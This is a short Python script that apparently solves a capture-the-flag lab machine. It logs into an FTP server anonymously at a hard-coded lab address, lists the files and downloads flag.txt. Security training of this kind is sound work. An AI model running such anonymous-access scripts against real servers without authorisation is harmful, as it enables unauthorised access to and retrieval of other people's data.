#!/usr/bin/env python3
from ftplib import FTP

TARGET = "10.129.246.9" #replace it by the new machine address
USERNAME = "anonymous"
PASSWORD = ""

def main():
    try:
        print(f"[*] Connecting to {TARGET} ...")
        ftp = FTP(TARGET)
        ftp.login(user=USERNAME, passwd=PASSWORD)
        print("[+] Anonymous login successful")

        print("[*] Listing files:")
        ftp.retrlines("LIST")

        print("\n[*] Downloading flag.txt ...")
        ftp.retrbinary("RETR flag.txt", open("flag.txt", "wb").write)
        ftp.quit()

        with open("flag.txt", "r") as f:
            flag = f.read().strip()
            print(f"\n[+] Flag: {flag}")

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()
